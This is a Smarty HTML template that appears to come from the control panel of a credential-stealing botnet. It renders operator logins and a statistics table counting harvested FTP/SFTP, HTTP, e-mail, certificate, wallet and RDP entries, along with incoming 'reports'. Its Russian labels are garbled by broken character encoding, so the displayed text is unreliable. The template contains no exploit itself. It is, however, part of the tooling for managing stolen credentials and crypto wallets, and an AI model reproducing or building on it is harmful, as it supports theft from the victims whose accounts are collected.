<div class="mychart" id="ftp_last_24_hours">
<img width="680" height="230" src="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=chart&amp;routine=last_24_hours" alt="" />
</div>

{if ($show_logons_to_users || $priv_is_admin) && !$disable_ip_logger}
	{if count($login_list)}
			<h4>��������� ����� � �������</h4>
			
			<table id="table_logins" width="700" cellspacing="0" summary="Latest user logins">
			<tr>
			<th width="14%">�����</th>
			<th width="19%">IP</th>
			<th width="42%">������</th>
			<th width="25%">����� �����</th>
			</tr>

			{foreach from=$login_list item=login_item}
			<tr>
			<td>{$login_item.user}</td>
			<td>{$login_item.ip}</td>
			<td>{country base_path="includes/design/images/flags/" country_code=$login_item.country_code country_name=$login_item.country_name}</td>
			<td>{$login_item.import_time}</td>
			</tr>
			{/foreach}

			</table><br />
	{/if}
{/if}

{if $show_domains && ($show_domains_to_users || $priv_is_admin)}
	{if count($domain_list)}
			<h4>������</h4><table id="table_domains" width="700" cellspacing="0" summary="Domains ping status">
			<tr>
			<th width="75%">�����</th>
			<th width="25%">������</th>
			</tr>

			{foreach from=$domain_list item=domain_item}
			<tr>
			<td><a target="_blank" href="{$domain_item.url}">{$domain_item.url}</a></td>
			<td><p id="chk_status_{$domain_item.domain_id}"><span class="wait"></span></p></td>
			</tr>
			{/foreach}

			</table><br />
	{/if}
{/if}

			<table id="table_stats" width="700" cellspacing="0" summary="Statistics">
			<tr>
			<th colspan="2">����������</th>
			</tr>
			
			<tr><td width="75%">����� �������</td><td width="25%">{$server_time}</td></tr>
			<tr><td>FTP/SFTP � ������</td><td>{$total_ftp_items_count+$total_ssh_items_count}</td></tr>
			{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
			<tr><td>HTTP/HTTPS � ������</td><td>{$total_http_items_count}</td></tr>
			{/if}
			{if $enable_email_mode && ($show_email_to_users || $priv_is_admin)}
			<tr><td>E-mail ������� � ������</td><td>{$total_email_items_count}</td></tr>
			{/if}
			{if $show_other_to_users || $priv_is_admin}
			<tr><td>������������ � ������</td><td>{$total_cert_items_count}</td></tr>
			{/if}
			{if $show_other_to_users || $priv_is_admin}
			<tr><td>��������� � ������</td><td>{$total_wallet_items_count}</td></tr>
			{/if}
			<tr><td>RDP � ������</td><td>{$total_rdp_items_count}</td></tr>
			<tr><td>���������� �������</td><td>{$total_reports_count}</td></tr>
			<tr><td>�������� ����������</td><td>{$report_duplicates}</td></tr>
			<tr><td>�� ���������� �������</td><td>{$total_nonparsed_reports}</td></tr>
			<tr><td>������� � ��������� �����</td><td>{$log_events_count}</td></tr>
			<tr><td>������ ������ ������� � ��</td><td>{$total_reports_size|file_size}</td></tr>
			<tr><td>������ ������ ��</td><td>{$db_size|file_size}</td></tr>
			{if $enable_http_mode && ($show_http_to_users || $priv_is_admin)}
			<tr><td>��������� FTP (HTTP) �� ��������� 24 ����</td><td>{$new_ftp_last_24_hours} ({$new_http_last_24_hours})</td></tr>
			<tr><td>��������� FTP (HTTP) �� ��������� ���</td><td>{$new_ftp_last_hour} ({$new_http_last_hour})</td></tr>
			<tr><td>��������� FTP (HTTP) �� ��������� 10 �����</td><td>{$new_ftp_last_10_minutes} ({$new_http_last_10_minutes})</td></tr>
			{else}
			<tr><td>��������� FTP �� ��������� 24 ����</td><td>{$new_ftp_last_24_hours}</td></tr>
			<tr><td>��������� FTP �� ��������� ���</td><td>{$new_ftp_last_hour}</td></tr>
			<tr><td>��������� FTP �� ��������� 10 �����</td><td>{$new_ftp_last_10_minutes}</td></tr>
			{/if}
			<tr><td>��������� ������� �� ��������� 24 ����</td><td>{$new_reports_last_24_hours}</td></tr>
			<tr><td>��������� ������� �� ��������� ���</td><td>{$new_reports_last_hour}</td></tr>
			<tr><td>��������� ������� �� ��������� 10 �����</td><td>{$new_reports_last_10_minutes}</td></tr>
			</table>
